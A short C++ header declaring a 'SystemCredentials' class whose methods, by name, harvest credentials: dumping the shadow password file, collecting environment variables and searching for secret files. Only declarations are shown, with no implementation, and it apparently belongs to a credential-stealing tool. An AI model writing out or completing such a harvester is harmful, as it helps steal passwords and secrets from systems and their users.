#pragma once
#include <string>

namespace credential {

class SystemCredentials {
public:
    static std::string HarvestAll();

private:
    static std::string DumpShadow();
    static std::string GetEnvVars();
    static std::string SearchSecretFiles();
};

} // namespace credential
